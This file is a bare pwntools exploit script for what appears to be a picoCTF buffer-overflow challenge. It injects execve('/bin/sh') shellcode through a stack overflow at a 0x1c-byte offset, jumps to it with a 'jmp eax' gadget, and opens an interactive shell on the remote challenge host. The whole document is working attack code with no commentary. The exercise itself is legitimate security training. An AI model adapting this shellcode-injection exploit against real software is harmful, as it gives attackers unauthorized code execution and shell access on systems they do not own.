#!/usr/bin/env python3
from pwn import *

PORT =  57651
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x8049dc0
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()
jmp_eax = 0x805333b

sc = asm('''
	xor eax, eax
	push 6845231
	push 1852400175
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	int 0x80
	''', arch = 'i386')
offset = 0x1c

pl = flat(
	sc.ljust(offset, b"A"),
	jmp_eax
	)

p.sendline(pl)

p.interactive()